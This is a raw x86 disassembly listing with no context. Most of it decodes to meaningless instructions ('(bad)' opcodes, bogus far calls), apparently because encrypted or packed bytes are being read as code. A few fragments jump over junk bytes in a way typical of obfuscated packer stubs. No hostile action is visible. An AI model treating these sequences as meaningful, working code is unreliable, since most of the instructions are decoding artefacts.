  413464:	in     eax,0x7e
  413466:	js     0x4134e0
  413468:	leave  
  413469:	(bad)  
  41346a:	aas    
  41346b:	hlt    
  41346c:	cmc    
  41346d:	sub    bh,ch
  41346f:	pop    esp
  413470:	xor    esi,eax
  413472:	xor    BYTE PTR [edx],dh
  413474:	repnz aaa 
  413476:	js     0x4134cd
  413478:	pop    ebp
  413479:	sub    DWORD PTR [edx],ebp
  41347b:	test   DWORD PTR [edx-0x1b],edx
  41347e:	loop   0x4134bf
  413480:	cwde   
  413481:	xor    eax,ebx
  413483:	call   0x6bc4:0x7158d810
  41348a:	or     al,0x37
  41348c:	mov    eax,0x52d189bc
  413491:	repnz das 
  413493:	addr16 aaa 
  413495:	bound  ebx,QWORD PTR [ebx]
  413497:	mov    al,0x8b
  413499:	mov    ds:0x6dcba203,eax
  41349e:	lock jae 0x413489
  4134a1:	add    eax,ebp
  4134a3:	stc    
  4134a4:	fwait
  4134a5:	das    
  4134a6:	push   cs
  4134a7:	aad    0x30
  4134a9:	jmp    0x41350a
  4134ab:	ds mul esp
  4134ae:	dec    ebx
  4134af:	pop    esi
  4134b0:	mov    WORD PTR [ecx-0x1d],ss
  4134b3:	shl    BYTE PTR fs:[ecx+ecx*8+0x38],0x20
  4134b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134ba:	jge    0x4134c8
  4134bc:	adc    ah,al
  4134be:	jae    0x41347d
  4134c0:	popa   
  4134c1:	inc    eax
  4134c2:	push   0xffffffca
  4134c4:	iret   
  4134c5:	bound  esi,QWORD PTR [eax+0x6af32723]
  4134cb:	xlat   BYTE PTR ds:[ebx]
  4134cc:	test   BYTE PTR [eax],0x66
  4134cf:	call   0x896bcd
  4134d4:	inc    ebp
  4134d5:	mov    BYTE PTR [edx],dh
  4134d7:	(bad)  
  4134d9:	div    BYTE PTR [edi-0x6c]
  4134dc:	sbb    BYTE PTR [edi-0x489e4b27],bl
  4134e2:	jmp    0x519b5b32
  4134e7:	imul   ecx,DWORD PTR [ecx-0x76],0x4c
  4134eb:	fwait
  4134ec:	or     esp,DWORD PTR [ebp-0x4698777f]
  4134f2:	xchg   ecx,eax
  4134f3:	or     al,0xf8
  4134f5:	cli    
  4134f6:	add    DWORD PTR [ebx+0x13],edx
  4134f9:	inc    ebx
  4134fa:	cwde   
  4134fb:	lock add ah,BYTE PTR [esi]
  4134fe:	call   0x43a:0x1a223f50
  413505:	mov    esi,0x2f3efbba
  41350a:	and    eax,DWORD PTR [ebp-0x53f030d2]
  413510:	adc    bh,cl
  413512:	int3   
  413513:	inc    esp
  413514:	pop    esi
  413515:	rep stos BYTE PTR es:[edi],al
  413517:	outs   dx,BYTE PTR ds:[esi]
  413518:	sahf   
  413519:	(bad)  
  41351a:	sbb    BYTE PTR [edi],0xea
  41351d:	cmp    al,0x45
  41351f:	jmp    0x41350a
  413521:	add    edi,DWORD PTR [edx]
  413523:	das    
  413524:	inc    edi
  413525:	sar    dh,0x25
  413528:	push   ebp
  413529:	jg     0x4134ae
  41352b:	mov    es,WORD PTR [esi+0x4a]
  41352e:	cmp    al,0xa2
  413530:	add    ah,al
  413532:	mov    edx,DWORD PTR [ebp+0x71af4770]
  413538:	jg     0x4134fa
  41353a:	jne    0x4135a2
  41353c:	int3   
  41353d:	jnp    0x4134f2
  41353f:	ja     0x4135a2
  413541:	dec    eax
  413542:	leave  
  413543:	xor    dl,bl
  413545:	int    0xc8
  413547:	pop    esi
  413548:	ror    BYTE PTR ds:0x3562456b,0x72
  41354f:	mov    ds:0x89702264,eax
  413554:	imul   esp,DWORD PTR [esi+0x2a],0xffffffe9
  413558:	mov    ch,0xc9
  41355a:	xor    ah,al
  41355c:	jne    0x41353e
  41355e:	sbb    esi,DWORD PTR [ecx]
  413560:	mov    edi,0xd853b601
  413565:	test   dl,dl
  413567:	jecxz  0x413533
  413569:	sub    ebx,DWORD PTR ds:0x1f8a5228
  41356f:	or     eax,0x42f93c7e
  413574:	adc    ch,BYTE PTR [eax-0x78]
  413577:	and    esi,DWORD PTR [eax-0x3e7c9a06]
  41357d:	icebp  
  41357e:	mov    ebx,DWORD PTR [edi]
  413580:	jbe    0x4135a1
  413582:	sahf   
  413583:	icebp  
  413584:	pop    es
  413585:	jb     0x41352e
  413587:	or     BYTE PTR [ecx-0x8],ch
  41358a:	pushf  
  41358b:	or     eax,0x7ab9ced3
  413590:	fxch   st(5)
  413592:	add    DWORD PTR [ecx+0x23],ebx
  413595:	(bad)  
  413597:	adc    dl,bh
  413599:	enter  0x7bbd,0x3c
  41359d:	retf   0xf75d
  4135a0:	and    DWORD PTR [esp+eax*4-0x51],ebx
  4135a4:	cmp    eax,DWORD PTR [ecx-0x34]
  4135a7:	out    dx,eax
  4135a8:	int    0xbe
  4135aa:	pushf  
  4135ab:	repnz pop edx
  4135ad:	lahf   
  4135ae:	dec    ebp
  4135af:	aas    
  4135b0:	rcr    cl,1
  4135b2:	mov    ebx,0xd1768f14
  4135b7:	mov    bl,0x76
  4135b9:	mov    DWORD PTR [ecx-0x4f8aa0e2],edx
  4135bf:	jl     0x4135e6
  4135c1:	or     DWORD PTR [ebx],0x69
  4135c4:	pop    ss
  4135c5:	jmp    0xa037:0x72ff58be
  4135cc:	adc    eax,0x94374117
  4135d1:	in     al,0x94
  4135d3:	pusha  
  4135d4:	sub    dh,ah
  4135d6:	dec    edx
  4135d7:	cmp    BYTE PTR ds:0x1f2af0d8,dl
  4135dd:	dec    edi
  4135de:	mov    ah,0x36
  4135e0:	cli    
  4135e1:	or     dl,BYTE PTR [esi+0x56]
  4135e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135e5:	popa   
  4135e6:	mov    ebp,0x348f45ec
  4135eb:	xor    DWORD PTR [ecx],edx
  4135ed:	outs   dx,DWORD PTR ds:[esi]
  4135ee:	ss dec esp
  4135f0:	aam    0xc5
  4135f2:	aas    
  4135f3:	jbe    0x4135a8
  4135f5:	ins    BYTE PTR es:[edi],dx
  4135f6:	jle    0x413586
  4135f8:	ins    DWORD PTR es:[edi],dx
  4135f9:	neg    BYTE PTR [edx]
  4135fb:	mov    eax,ds:0xc60e2781
  413600:	push   0x55fd636d
  413605:	mov    dh,0x45
  413607:	lds    eax,FWORD PTR [ebx]
  413609:	jns    0x4135b1
  41360b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41360c:	in     eax,dx
  41360d:	jmp    0x883f:0x8e7a323f
  413614:	repz int 0x5a
  413617:	mov    cx,0x8bdf
  41361b:	call   0x99cb5686
  413620:	popa   
  413621:	pop    ds
  413622:	push   ss
  413623:	xchg   edi,eax
  413624:	test   eax,0x7ccd575f
  413629:	push   edx
  41362a:	in     al,0x5b
  41362c:	adc    al,0xbf
  41362e:	pop    esi
  41362f:	xor    ch,bh
  413631:	outs   dx,DWORD PTR ds:[esi]
  413632:	in     eax,0x18
  413634:	and    al,0x86
  413636:	jge    0x413650
  413638:	lods   eax,DWORD PTR ds:[esi]
  413639:	mov    ds:0x50c6c3cf,al
  41363e:	mov    bl,0xe5
  413640:	outs   dx,DWORD PTR ds:[esi]
  413641:	cld    
  413642:	xor    ebx,esi
  413644:	inc    esp
  413645:	int3   
  413646:	(bad)  
  413647:	hlt    
  413648:	test   DWORD PTR [edi-0x73],ebx
  41364b:	xlat   BYTE PTR ds:[ebx]
  41364c:	arpl   WORD PTR [edi-0x462fe877],sp
  413652:	test   eax,0x9c4b6250
  413657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413658:	push   ebp
  413659:	push   ebx
  41365a:	or     cl,BYTE PTR [ebx+0x39]
  41365d:	ins    DWORD PTR es:[edi],dx
  41365e:	sub    BYTE PTR [esi+esi*1+0x39],bh
  413662:	mul    BYTE PTR [ebx]
  413664:	mov    eax,0x780c0a74
  413669:	dec    ebx
  41366a:	gs jae 0x413669
  41366d:	adc    eax,DWORD PTR [ebp-0x36]
  413670:	das    
  413671:	adc    esp,eax
  413673:	popf   
  413674:	(bad)  
  413675:	xchg   ecx,eax
  413676:	(bad)  
  413678:	ret    
  413679:	idiv   BYTE PTR [ebx]
  41367b:	retf   0x1480
  41367e:	pop    esp
  41367f:	lods   al,BYTE PTR ds:[esi]
  413680:	or     eax,0xd060d9ff
  413685:	jmp    0x84f3:0xf859cb61
  41368c:	xor    eax,0x438cd1c2
  413691:	call   0xa0feba2
  413696:	stmxcsr DWORD PTR [ebx]
  413699:	ja     0x413678
  41369b:	xchg   DWORD PTR [edx],edi
  41369d:	mov    ebx,0xe70c2cf0
  4136a2:	out    dx,eax
  4136a3:	mov    bl,0x72
  4136a5:	xor    DWORD PTR [ebx-0x2dbc1ae3],ecx
  4136ab:	jl     0x413715
  4136ad:	inc    ch
  4136af:	or     BYTE PTR [eax+0x39],cl
  4136b2:	clc    
  4136b3:	mov    dl,0x8f
  4136b5:	or     ebx,DWORD PTR ds:0x1f7037eb
  4136bb:	sub    al,0xe4
  4136bd:	or     dl,BYTE PTR [edx-0x61]
  4136c0:	(bad)  
  4136c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136c2:	call   0x11cec8c5
  4136c7:	xchg   ecx,eax
  4136c8:	in     eax,dx
  4136c9:	jg     0x4136bd
  4136cb:	pop    ecx
  4136cc:	jmp    DWORD PTR [edx-0x72]
  4136cf:	cdq    
  4136d0:	cld    
  4136d1:	(bad)  
  4136d2:	cmp    BYTE PTR [ebx+0x7d8bbc55],cl
  4136d8:	hlt    
  4136d9:	xor    edx,eax
  4136db:	xor    edi,eax
  4136dd:	add    edx,ecx
  4136df:	add    edi,ecx
  4136e1:	jmp    0x413969
  4136e6:	ror    ecx,0xc2
  4136e9:	ror    dl,0xc7
  4136ec:	leave  
  4136ed:	leave  
  4136ee:	mov    ?,WORD PTR [ebp-0x3bd38de7]
  4136f4:	push   esi
  4136f5:	or     eax,0x787f7d28
  4136fa:	in     eax,0x7e
  4136fc:	js     0x413776
  4136fe:	sbb    edi,DWORD PTR cs:[bp+di-0xf]
  413703:	sub    BYTE PTR [ebx],al
  413705:	push   cs
  413706:	(bad)  
  413707:	cmp    bh,BYTE PTR [ebx+0x49c8beb7]
  41370d:	lods   eax,DWORD PTR ds:[esi]
  41370e:	mul    ecx
  413710:	call   0xb99ef4fe
  413715:	pop    edi
  413716:	out    dx,eax
  413717:	mov    dh,ch
  413719:	aam    0x3e
  41371b:	inc    ecx
  41371c:	or     eax,0xc97f4649
  413721:	int3   
  413722:	adc    BYTE PTR [ebx-0x1c5ea341],bl
  413728:	adc    BYTE PTR [esi],0x20
  41372b:	pop    ebx
  41372c:	cmc    
  41372d:	call   0xc8d4:0xb511d2c7
  413734:	pop    ecx
  413735:	cmovl  esp,DWORD PTR [ebx+0x7a17ed94]
  41373c:	pop    ebp
  41373d:	mov    edi,0xd4aa5f63
  413742:	scas   eax,DWORD PTR es:[edi]
  413743:	test   al,0x13
  413745:	js     0x4137ae
  413747:	nop
  413748:	add    DWORD PTR [edx-0x6c4e1baa],esp
  41374e:	sub    eax,0x5f2d4542
  413753:	dec    esi
  413754:	add    DWORD PTR ds:0x52d140da,esi
  41375a:	popa   
  41375b:	or     al,0xa6
  41375d:	loop   0x413743
  41375f:	bound  esi,QWORD PTR [edi]
  413761:	test   DWORD PTR [ecx+0x1d684d5a],esi
  413767:	xor    DWORD PTR [esp+ebx*2-0x2a],ebp
  41376b:	outs   dx,BYTE PTR ds:[esi]
  41376c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41376d:	mov    edi,0x34d85f63
  413772:	sub    BYTE PTR [ecx+0x40],al
  413775:	sub    edx,DWORD PTR [esi+0x4d]
  413778:	jp     0x413794
  41377a:	fldcw  WORD PTR [esp+edx*2-0x45d0c818]
  413781:	cwde   
  413782:	not    BYTE PTR [edi+0x1c71f21e]
  413788:	or     eax,DWORD PTR [edi]
  41378a:	and    BYTE PTR [ecx],dl
  41378c:	mov    al,ds:0xca3d44b4
  413791:	add    bh,cl
  413793:	jecxz  0x4137d5
  413795:	mov    al,ds:0x8c9a1cde
  41379a:	stc    
  41379b:	inc    esi
  41379c:	imul   ebx,DWORD PTR ds:[edx-0x60db39e4],0xa56a03ba
  4137a7:	nop
  4137a8:	clc    
  4137a9:	je     0x413755
  4137ab:	lds    edx,FWORD PTR [ebp+0x3bd2062a]
  4137b1:	pop    esp
  4137b2:	out    0xbc,al
  4137b4:	xor    ebp,ebp
  4137b6:	aaa    
  4137b7:	out    dx,al
  4137b8:	fcmovbe st,st(6)
  4137ba:	sub    cl,BYTE PTR [ecx-0x5e]
  4137bd:	mov    edx,0xf467c7c5
  4137c2:	aam    0x1e
  4137c4:	inc    esp
  4137c5:	cmp    bl,bh
  4137c7:	mov    ah,0x55
  4137c9:	pop    ds
  4137ca:	fs ret 
  4137cc:	out    dx,eax
  4137cd:	dec    BYTE PTR [edi-0x39c071f7]
  4137d3:	cmp    al,0x47
  4137d5:	mov    cl,0xab
  4137d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137d8:	mov    dh,0x30
  4137da:	dec    ebp
  4137db:	addr16 (bad) 
  4137dd:	sub    eax,0x7160c2a
  4137e2:	jae    0x41377f
  4137e4:	fild   QWORD PTR [ecx+0x5e]
  4137e7:	psubsb mm3,QWORD PTR [ecx-0x1c222632]
  4137ee:	adc    ebp,0x84ad8419
  4137f4:	dec    ecx
  4137f5:	sbb    al,BYTE PTR [ecx]
  4137f7:	aad    0x7
  4137f9:	or     DWORD PTR [eax+ecx*1+0x4cbcdab6],esi
  413800:	repz addr16 test edi,esi
  413804:	or     bl,BYTE PTR [edx+0x4e]
  413807:	clc    
  413808:	arpl   WORD PTR fs:[esi+0x36f04ed6],sp
  41380f:	or     eax,0x22f306bb
  413814:	jae    0x413876
  413816:	mov    edx,0x585ff682
  41381b:	outs   dx,DWORD PTR ds:[esi]
  41381c:	loopne 0x41384c
  41381e:	jg     0x413827
  413820:	aam    0xb
  413822:	cwde   
  413823:	int3   
  413824:	xor    BYTE PTR [ecx],0x12
  413827:	mov    ds:0xcbc57768,eax
  41382c:	mov    esp,ebp
  41382e:	inc    ebp
  41382f:	sar    DWORD PTR [eax+0x2e6bff41],cl
  413835:	fwait
  413836:	aas    
  413837:	(bad)  
  413838:	cld    
  413839:	push   esi
  41383a:	test   ch,dh
  41383c:	dec    edx
  41383d:	aad    0xe
  41383f:	pop    eax
  413840:	mov    fs,ebx
  413842:	mov    edx,0x2a61f202
  413847:	cmp    edi,esi
  413849:	fcmovbe st,st(4)
  41384b:	xchg   ecx,eax
  41384c:	setp   BYTE PTR [esi+0x7166903f]
  413853:	add    DWORD PTR [esi+edi*2],0xffffffb8
  413857:	sub    cl,BYTE PTR [ebx-0x2d]
  41385a:	adc    DWORD PTR [ebp-0x1f],esi
  41385d:	fdiv   DWORD PTR [ebx]
  41385f:	shl    BYTE PTR [esp+eiz*2-0x57],1
  413863:	fisttp WORD PTR [ebx+0x53b00d5]
  413869:	loopne 0x4138a4
  41386b:	and    BYTE PTR [ebp+0x5c14b178],dl
  413871:	jmp    0xd846cbb6
  413876:	dec    ebx
  413877:	je     0x4138f7
  413879:	sbb    al,ch
  41387b:	out    0x4f,al
  41387d:	inc    esp
  41387e:	jge    0x41382b
  413880:	jg     0x413872
  413882:	sub    eax,0xc0fe043e
  413887:	xor    ecx,DWORD PTR [ebp+0x11]
  41388a:	pusha  
  41388b:	xchg   ebp,eax
  41388c:	pop    ds
  41388d:	es stc 
  41388f:	into   
  413890:	fistp  WORD PTR [ecx-0x8]
  413893:	in     al,0x1a
  413895:	push   ss
  413896:	dec    edi
  413897:	xor    eax,0xe9a5a876
  41389c:	xor    DWORD PTR [ebx-0x32],ebx
  41389f:	push   cs
  4138a0:	fs push eax
  4138a2:	jmp    0x9c12ccca
  4138a7:	fwait
  4138a8:	pushw  0x500d
  4138ac:	xchg   ebp,eax
  4138ad:	sti    
  4138ae:	xchg   ecx,eax
  4138af:	outs   dx,DWORD PTR ds:[esi]
  4138b0:	out    dx,al
  4138b1:	pop    ecx
  4138b2:	lods   al,BYTE PTR ds:[esi]
  4138b3:	clc    
  4138b4:	and    al,0x60
  4138b6:	jb     0x41383d
  4138b8:	jo     0x413935
  4138ba:	call   0x58b5:0x5d15607f
  4138c1:	mov    eax,DWORD PTR [edi]
  4138c3:	daa    
  4138c4:	es retf 
  4138c6:	(bad)  
  4138c7:	out    0x23,eax
  4138c9:	jmp    0xaf84:0x4e276005
  4138d0:	jle    0x4138c6
  4138d2:	mov    edi,0xa484a4b
  4138d7:	or     al,0xfc
  4138d9:	jge    0x4138a6
  4138db:	fcom   DWORD PTR [esi+0x18]
  4138de:	inc    edi
  4138df:	cmp    dh,al
  4138e1:	sub    BYTE PTR [edx+0x41],bl
  4138e4:	fcom   QWORD PTR [edi]
  4138e6:	daa    
  4138e7:	cmp    al,BYTE PTR [ecx-0x20197fc5]
  4138ed:	test   esp,0x3bf1af1f
  4138f3:	ins    DWORD PTR es:[edi],dx
  4138f4:	fistp  WORD PTR [ebx+0x4b]
  4138f7:	jmp    0x413967
  4138f9:	inc    edi
  4138fa:	lods   eax,DWORD PTR ds:[esi]
  4138fb:	xchg   ah,ch
  4138fd:	and    cl,BYTE PTR [eax]
  4138ff:	int    0xd0
  413901:	jbe    0x413887
  413903:	adc    al,0x96
  413905:	fadd   DWORD PTR [esi+0x4f5c7d47]
  41390b:	or     DWORD PTR [ebx-0x4ee1ec8c],0x45
  413912:	and    bh,BYTE PTR [ebx-0x4]
  413915:	mov    cs,WORD PTR [esi+edi*1]
  413918:	leave  
  413919:	test   eax,0xc44ae351
  41391e:	dec    edi
  41391f:	repnz in eax,0x27
  413922:	dec    ecx
  413923:	or     cl,cl
  413925:	out    dx,eax
  413926:	bound  esi,QWORD PTR [ebp-0x7a00544a]
  41392c:	lahf   
  41392d:	jp     0x41391a
  41392f:	mov    dh,0xba
  413931:	and    bh,ch
  413933:	mov    BYTE PTR [edx+0x17],dl
  413936:	cmc    
  413937:	inc    ebp
  413938:	mov    ds:0x94e62bf4,eax
  41393d:	call   0x8536:0xadd2c7ee
  413944:	jecxz  0x41391f
  413946:	in     eax,dx
  413947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413948:	push   es
  413949:	or     dl,ah
  41394b:	rol    DWORD PTR [edx],cl
  41394d:	ret    0x6d97
  413950:	mov    ch,0xa
  413952:	add    ebx,eax
  413954:	xchg   edx,eax
  413955:	enterw 0x2df0,0xdd
  41395a:	loope  0x413906
  41395c:	sub    DWORD PTR [edx-0x26],esp
  41395f:	inc    esi
  413960:	je     0x413935
  413962:	out    0x85,eax
  413964:	rcl    BYTE PTR [ebx],0x3f
  413967:	xchg   DWORD PTR [edx+0xf],edi
  41396a:	scas   eax,DWORD PTR es:[edi]
  41396b:	xlat   BYTE PTR ds:[ebx]
  41396c:	add    edx,DWORD PTR [ebp-0x14]
  41396f:	mov    DWORD PTR [ebp-0x14],edx
  413972:	mov    edx,DWORD PTR [ebp-0xc]
  413975:	mov    edi,DWORD PTR [ebp-0x24]
  413978:	xor    edx,eax
  41397a:	add    edx,ecx
  41397c:	imul   edx,edi
  41397f:	mov    edi,DWORD PTR [ebp-0xc]
  413982:	xor    edi,eax
  413984:	jmp    0x413c0c
  413989:	enter  0xc4cf,0xca
  41398d:	retf   
  41398e:	fxch   st(6)
  413990:	fld    DWORD PTR [edx]
  413992:	xchg   edx,eax
  413993:	(bad)  
  413994:	loope  0x4139d0
  413996:	lock sub ebx,DWORD PTR [ecx+0x787f0395]
  41399d:	in     eax,0x7e
  41399f:	js     0x413a19
  4139a1:	jl     0x41395b
  4139a3:	sub    eax,0x3583627
  4139a8:	xlat   BYTE PTR ds:[ebx]
  4139a9:	and    eax,0x5066755e
  4139ae:	(bad)  
  4139af:	repnz mov bh,0xd9
  4139b2:	aam    0x63
  4139b4:	out    0xb8,eax
  4139b6:	cmovl  ebp,DWORD PTR [edx*1-0x22921546]
  4139be:	rol    DWORD PTR [edi-0x140a84d3],0x6f
  4139c5:	push   0x44
  4139c7:	pop    edx
  4139c8:	mov    ah,0xa4
  4139ca:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4139cc:	inc    esi
  4139cd:	in     eax,0x4e
  4139cf:	sbb    DWORD PTR [ecx-0x7acea5d6],ebp
  4139d5:	sub    ebx,DWORD PTR [ecx+ebx*2]
  4139d8:	cmp    DWORD PTR [edi-0x11140787],0x3d67a902
  4139e2:	(bad)  
  4139e4:	mov    edx,ds
  4139e6:	aas    
  4139e7:	(bad)  
  4139e8:	stos   DWORD PTR es:[edi],eax
  4139e9:	xchg   esi,eax
  4139ea:	int3   
  4139eb:	jb     0x413a05
  4139ed:	inc    ebp
  4139ee:	xchg   esp,eax
  4139ef:	mov    ds:0x3ea67a16,al
  4139f4:	or     edx,DWORD PTR [ebp+0x1f]
  4139f7:	ror    BYTE PTR [ebx-0x28],0x20
  4139fb:	push   0x6fb0c8f9
  413a00:	mov    ds:0x9a4d396e,eax
  413a05:	pop    ss
  413a06:	jns    0x413a09
  413a08:	cwde   
  413a09:	cmovb  ebx,DWORD PTR [esi+0x73286fc6]
  413a10:	(bad)  
  413a11:	loope  0x413a74
  413a13:	mov    esi,0xd9a6afe0
  413a18:	mov    ds:0xb5b5d8ad,al
  413a1d:	or     DWORD PTR [ebp-0x55bd8a00],esi
  413a23:	sub    al,0x19
  413a25:	rol    al,0x98
  413a28:	cdq    
  413a29:	inc    edi
  413a2a:	mov    ?,WORD PTR [edx]
  413a2c:	xor    al,0x7f
  413a2e:	fst    DWORD PTR [esi+0x2d]
  413a31:	leave  
  413a32:	shr    DWORD PTR [esi],cl
  413a34:	xor    edx,edx
  413a36:	mov    edi,0x4fb52e48
  413a3b:	cdq    
  413a3c:	cmp    al,0x90
  413a3e:	xchg   edx,eax
  413a3f:	or     eax,edi
  413a41:	cld    
  413a42:	fcmovnu st,st(5)
  413a44:	call   0x86146f89
  413a49:	loopne 0x413a46
  413a4b:	mov    dl,BYTE PTR [ecx-0x74]
  413a4e:	ja     0x413a2d
  413a50:	sub    BYTE PTR [edi-0x509d687c],al
  413a56:	or     ecx,edi
  413a58:	fidivr DWORD PTR ds:0x987b8276
  413a5e:	push   esi
  413a5f:	fs std 
  413a61:	mul    BYTE PTR [ebp-0xf]
  413a64:	mov    al,ds:0xa0503832
  413a69:	popf   
  413a6a:	icebp  
  413a6b:	fsubrp st(5),st
  413a6d:	fsubr  DWORD PTR [edx+0x475f53db]
  413a73:	(bad)  
  413a74:	mov    dh,0x31
  413a76:	inc    esp
  413a77:	xor    al,0xfb
  413a79:	pop    ecx
  413a7a:	rcl    BYTE PTR [ebx+ecx*2+0x25cc085b],1
  413a81:	(bad)  
  413a82:	or     eax,0xd9b26f70
  413a87:	jns    0x413ab4
  413a89:	inc    ebx
  413a8a:	dec    eax
  413a8b:	mov    ds:0xe2b7134d,al
  413a90:	stc    
  413a91:	cmp    eax,0x940443be
  413a96:	std    
  413a97:	div    DWORD PTR [ebp-0x5e47949e]
  413a9d:	std    
  413a9e:	sub    eax,0x707adac3
  413aa3:	mov    ecx,0xf5714f23
  413aa8:	cli    
  413aa9:	jmp    0xef4656b5
  413aae:	adc    DWORD PTR [edx],esi
  413ab0:	jge    0x413aa3
  413ab2:	je     0x413ac5
  413ab4:	push   esp
  413ab5:	mov    ebp,0xf52c670d
  413aba:	add    al,0x8c
  413abc:	pop    ss
  413abd:	enter  0xcf97,0x50
  413ac1:	mov    WORD PTR [ebx-0x7d0c09de],ss
  413ac7:	mov    ebx,0x6cf088c4
  413acc:	push   0x3a
  413ace:	fiadd  WORD PTR [ecx+0x4f]
  413ad1:	jae    0x413a92
  413ad3:	pop    eax
  413ad4:	mov    WORD PTR ds:0x945979e4,ss
  413ada:	ja     0x413b22
  413adc:	fldenv [edi-0x724ab101]
  413ae2:	adc    eax,0xb186f9b8
  413ae7:	mov    DWORD PTR [esi-0x726b8e68],0x42b30608
  413af1:	aaa    
  413af2:	or     eax,0x6f3cb95e
  413af7:	arpl   WORD PTR [ebp-0x163cf84d],dx
  413afd:	dec    edx
  413afe:	jecxz  0x413b06
  413b00:	sbb    ch,BYTE PTR [ebp-0x64]
  413b03:	int3   
  413b04:	sub    bl,BYTE PTR [ecx]
  413b06:	test   BYTE PTR [ecx+0xd],dh
  413b09:	mov    ecx,0x353fe384
  413b0e:	mov    esi,fs
  413b10:	xchg   ebp,eax
  413b11:	mov    ds:0x819456d5,eax
  413b16:	or     eax,0x6bac2c64
  413b1b:	xor    bl,BYTE PTR [ecx+0x3e2bcb46]
  413b21:	out    dx,eax
  413b22:	and    DWORD PTR [eax],edi
  413b24:	dec    ebp
  413b25:	adc    DWORD PTR [ebx],edi
  413b27:	mov    al,0xc5
  413b2a:	jmp    0x85b55959
  413b2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b30:	xor    esi,ebp
  413b32:	xor    BYTE PTR [eax],bh
  413b34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b35:	idiv   DWORD PTR [ebp-0x4ec63edd]
  413b3b:	ja     0x413b88
  413b3d:	and    al,0xf0
  413b3f:	cs dec esp
  413b41:	mov    eax,0x5ac97604
  413b46:	gs jmp 0x413b47
  413b49:	sbb    edx,DWORD PTR [edi+ecx*2]
  413b4c:	xchg   edx,eax
  413b4d:	stos   BYTE PTR es:[edi],al
  413b4e:	call   0x5de9baa1
  413b53:	adc    eax,0x430064a7
  413b58:	xchg   ebx,eax
  413b59:	mov    bl,0x26
  413b5b:	mov    ebp,0x44360135
  413b60:	adc    al,0x91
  413b62:	mov    cl,0x2a
  413b64:	add    DWORD PTR [ebx-0x9dec0ce],ecx
  413b6a:	out    0x12,al
  413b6c:	stc    
  413b6d:	push   es
  413b6e:	mov    al,0x53
  413b70:	and    eax,0x2b86272
  413b75:	(bad)  
  413b76:	xor    al,0xa8
  413b78:	ins    BYTE PTR es:[edi],dx
  413b79:	pop    edx
  413b7a:	and    DWORD PTR [ebx],ebp
  413b7c:	jns    0x413b26
  413b7e:	add    cl,ch
  413b80:	mov    ecx,0xb9d5b331
  413b85:	push   esp
  413b86:	mov    bh,0x36
  413b88:	xor    ah,BYTE PTR [edx-0x1773f865]
  413b8e:	mov    al,ds:0xf446be42
  413b93:	adc    DWORD PTR [esi],edi
  413b95:	jg     0x413ba5
  413b97:	push   ebp
  413b98:	lock cdq 
  413b9a:	dec    esi
  413b9b:	fimul  WORD PTR [ebp-0x16]
  413b9e:	inc    eax
  413b9f:	jmp    0x413b7a
  413ba1:	jno    0x413c0b
  413ba3:	leave  
  413ba4:	push   ss
  413ba5:	test   eax,0xcca5ded5
  413baa:	mov    ebx,0x2c6dc4b5
  413baf:	int    0xf9
  413bb1:	fcmovb st,st(6)
  413bb3:	out    0xe4,al
  413bb5:	pop    edx
  413bb6:	std    
  413bb7:	ror    BYTE PTR [edx],1
  413bb9:	add    eax,0x803b7856
  413bbe:	push   0x9cbc7d63
  413bc3:	in     al,0xff
  413bc5:	xor    al,0x9f
  413bc7:	stc    
  413bc8:	imul   DWORD PTR [ebx+edi*8+0x27ba767]
  413bcf:	cs sti 
  413bd1:	cwde   
  413bd2:	(bad)  
  413bd3:	ds mov ah,0xaf
  413bd6:	fucomip st,st(5)
  413bd8:	pop    esp
  413bd9:	(bad)  
  413bda:	sbb    eax,0x8f96de8
  413bdf:	repnz mov ebx,DWORD PTR [edi+0xd492463]
  413be6:	sub    DWORD PTR [ecx+esi*8-0x54],ebx
  413bea:	repz mov al,0xda
  413bed:	mov    ebx,0xf2127055
  413bf2:	pop    esp
  413bf3:	pop    edx
  413bf4:	xchg   ecx,eax
  413bf5:	scas   eax,DWORD PTR es:[edi]
  413bf6:	cmp    al,0xd
  413bf8:	inc    eax
  413bf9:	xor    bh,BYTE PTR [eax-0x7e]
  413bfc:	push   ds
  413bfd:	fld    TBYTE PTR [ecx]
  413bff:	mov    cl,0xca
  413c01:	mov    dh,0x6b
  413c03:	sub    bl,BYTE PTR [edi]
  413c05:	inc    edi
  413c06:	repnz pop DWORD PTR gs:[ecx-0x22]
  413c0b:	imul   ebp,DWORD PTR [ebx],0xf47d8bd7
  413c11:	mov    ebx,DWORD PTR [ebp-0x14]
  413c14:	xor    edi,eax
  413c16:	add    edi,ecx
  413c18:	jmp    0x413ea0
  413c1d:	(bad)  
  413c1e:	ror    al,cl
  413c20:	iret   
  413c21:	aam    0xd1
  413c23:	(bad)
  413c26:	ins    DWORD PTR es:[edi],dx
  413c27:	js     0x413c82
  413c29:	push   edi
  413c2a:	mov    cl,BYTE PTR [edi+0x7f0002f9]
  413c30:	js     0x413c17
  413c32:	jle    0x413cac
  413c34:	js     0x413c69
  413c36:	xor    esp,DWORD PTR [esi]
  413c38:	mov    BYTE PTR [ebp+0x78f8259a],ah
  413c3e:	cdq    
  413c3f:	mov    BYTE PTR [edx-0x8],ch
  413c42:	jl     0x413be3
  413c44:	rol    BYTE PTR gs:0x60215f4,cl
  413c4b:	das    
  413c4c:	bound  ebp,QWORD PTR [ebx-0x25]
  413c4f:	xor    ebp,DWORD PTR cs:[edx+0x74]
  413c53:	mul    DWORD PTR [ecx+0x7fc3a9ae]
  413c59:	jge    0x413cb0
  413c5b:	in     eax,0x6d
  413c5d:	xchg   BYTE PTR [ecx-0x3152e20f],dl
  413c63:	push   esi
  413c64:	mov    ch,0x67
  413c66:	fist   WORD PTR [esi+0x10285058]
  413c6c:	cli    
  413c6d:	inc    esi
  413c6e:	mov    edx,0xa9f3d78d
  413c73:	or     eax,DWORD PTR [ebp+ecx*4-0x41c5254a]
  413c7a:	adc    eax,0x60f9bb4f
